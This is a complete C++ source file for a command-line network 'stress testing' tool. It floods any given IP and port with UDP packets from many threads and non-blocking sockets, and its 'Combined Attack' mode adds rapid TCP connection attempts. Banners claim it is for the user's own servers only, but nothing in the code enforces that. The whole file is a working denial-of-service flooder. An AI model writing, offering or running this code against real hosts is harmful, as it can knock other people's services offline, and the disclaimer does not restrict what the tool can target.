#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <vector>
#include <atomic>
#include <random>
#include <netdb.h>
#include <fcntl.h>

class StressTester {
private:
    std::string target_ip;
    int target_port;
    int duration;
    int thread_count;
    std::atomic<bool> running;
    int packet_size;
    
public:
    StressTester(std::string ip, int port, int dur, int threads) 
        : target_ip(ip), target_port(port), duration(dur), thread_count(threads), running(true), packet_size(1400) {}
    
    // Create multiple sockets per thread
    void flood_with_udp() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1, 1000);
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &server_addr.sin_addr);
        
        // Create multiple sockets
        const int SOCKETS_PER_THREAD = 10;
        std::vector<int> socks;
        
        for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock > 0) {
                // Set non-blocking
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                socks.push_back(sock);
            }
        }
        
        // Random packet content
        char packet[1500];
        for (int i = 0; i < packet_size; i++) {
            packet[i] = rand() % 256;
        }
        
        auto start_time = std::chrono::steady_clock::now();
        
        while (running) {
            for (int sock : socks) {
                sendto(sock, packet, packet_size, 0, 
                       (struct sockaddr*)&server_addr, sizeof(server_addr));
            }
            
            auto current_time = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
            
            if (elapsed >= duration) {
                break;
            }
            
            // Minimal delay to keep high packet rate
            std::this_thread::sleep_for(std::chrono::microseconds(100));
        }
        
        for (int sock : socks) {
            close(sock);
        }
    }
    
    // TCP SYN-like pressure (connection attempts)
    void tcp_pressure() {
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &server_addr.sin_addr);
        
        auto start_time = std::chrono::steady_clock::now();
        
        while (running) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock > 0) {
                // Set non-blocking for quick connect attempts
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                
                connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
                close(sock);
            }
            
            auto current_time = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
            
            if (elapsed >= duration) {
                break;
            }
        }
    }
    
    void run_combined() {
        auto start_time = std::chrono::steady_clock::now();
        
        while (running) {
            // Send burst of packets
            for (int burst = 0; burst < 50; burst++) {
                flood_with_udp();
            }
            
            auto current_time = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
            
            if (elapsed >= duration) {
                running = false;
                break;
            }
        }
    }
    
    void start_udp_flood() {
        std::vector<std::thread> threads;
        for (int i = 0; i < thread_count; i++) {
            threads.emplace_back(&StressTester::flood_with_udp, this);
        }
        
        for (auto& t : threads) {
            t.join();
        }
    }
    
    void start_combined() {
        std::vector<std::thread> udp_threads;
        std::vector<std::thread> tcp_threads;
        
        // Half UDP, half TCP pressure
        int udp_count = thread_count / 2;
        int tcp_count = thread_count - udp_count;
        
        for (int i = 0; i < udp_count; i++) {
            udp_threads.emplace_back(&StressTester::flood_with_udp, this);
        }
        
        for (int i = 0; i < tcp_count; i++) {
            tcp_threads.emplace_back(&StressTester::tcp_pressure, this);
        }
        
        for (auto& t : udp_threads) {
            t.join();
        }
        
        for (auto& t : tcp_threads) {
            t.join();
        }
    }
};

int main(int argc, char* argv[]) {
    std::cout << "\n========================================\n";
    std::cout << "⚠️  STRESS TESTING TOOL\n";
    std::cout << "⚡ FOR YOUR OWN SERVERS ONLY\n";
    std::cout << "========================================\n\n";
    
    if (argc < 5) {
        std::cout << "Usage: " << argv[0] << " <ip> <port> <duration> <threads> [mode]\n\n";
        std::cout << "Modes:\n";
        std::cout << "  1 - UDP Flood (default)\n";
        std::cout << "  2 - Combined (UDP + TCP pressure)\n\n";
        std::cout << "Example: " << argv[0] << " 192.168.1.100 80 60 500 2\n";
        std::cout << "\n⚠️  ONLY use on servers YOU OWN!\n";
        return 1;
    }
    
    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threads = std::stoi(argv[4]);
    int mode = (argc >= 6) ? std::stoi(argv[5]) : 1;
    
    std::cout << "📡 Target (YOUR server): " << ip << ":" << port << "\n";
    std::cout << "⏱️  Duration: " << duration << " seconds\n";
    std::cout << "🧵 Threads: " << threads << "\n";
    std::cout << "🎯 Mode: " << (mode == 1 ? "UDP Flood" : "Combined Attack") << "\n";
    std::cout << "\n🔥 Starting stress test on YOUR server...\n\n";
    
    StressTester tester(ip, port, duration, threads);
    
    if (mode == 1) {
        tester.start_udp_flood();
    } else {
        tester.start_combined();
    }
    
    std::cout << "\n✅ Stress test completed on your server!\n";
    std::cout << "Check your server's status and logs.\n\n";
    
    return 0;
}